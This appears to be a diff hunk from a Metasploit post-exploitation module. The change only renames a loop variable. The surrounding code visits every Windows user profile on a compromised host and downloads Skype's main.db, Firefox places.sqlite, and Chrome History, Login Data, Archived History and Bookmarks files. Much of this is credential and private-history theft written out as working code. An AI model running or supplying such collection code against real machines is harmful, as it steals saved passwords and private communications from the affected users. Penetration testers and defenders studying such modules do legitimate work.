@@ -33,13 +33,13 @@ class Metasploit3 < Msf::Post
   end
   def run
     print_status("Grabbing user profiles")
-    grab_user_profiles().each do |p|
-       download_artifact("AppData",p,"skype", "Skype", "main.db", "binary/db") if check_artifact(p['AppData'],p['UserName'],"skype", "Skype")
-       download_artifact("AppData",p,"Firefox", "Mozilla", "places.sqlite","binary/db") if check_artifact(p['AppData'],p['UserName'],"Firefox","Mozilla")
-       download_artifact("LocalAppData",p,"Chrome_History", "Google", "History.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
-       download_artifact("LocalAppData",p,"Chrome_History", "Google", "Login Data.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
-       download_artifact("LocalAppData",p,"Chrome_History", "Google", "Archived History.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
-       download_artifact("LocalAppData",p,"Chrome_History", "Google", "Bookmarks.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
+    grab_user_profiles().each do |userprofile|
+       download_artifact("AppData",userprofile,"skype", "Skype", "main.db", "binary/db") if check_artifact(userprofile['AppData'],userprofile['UserName'],"skype", "Skype")
+       download_artifact("AppData",userprofile,"Firefox", "Mozilla", "places.sqlite","binary/db") if check_artifact(userprofile['AppData'],userprofile['UserName'],"Firefox","Mozilla")
+       download_artifact("LocalAppData",userprofile,"Chrome_History", "Google", "History.","binary/db") if check_artifact(userprofile['LocalAppData'],userprofile['UserName'],"Chrome History","Google")
+       download_artifact("LocalAppData",userprofile,"Chrome_History", "Google", "Login Data.","binary/db") if check_artifact(userprofile['LocalAppData'],userprofile['UserName'],"Chrome History","Google")
+       download_artifact("LocalAppData",userprofile,"Chrome_History", "Google", "Archived History.","binary/db") if check_artifact(userprofile['LocalAppData'],userprofile['UserName'],"Chrome History","Google")
+       download_artifact("LocalAppData",userprofile,"Chrome_History", "Google", "Bookmarks.","binary/db") if check_artifact(userprofile['LocalAppData'],userprofile['UserName'],"Chrome History","Google")
     end
   end
   def check_artifact(path, user, artifact_name, artifact_dir)
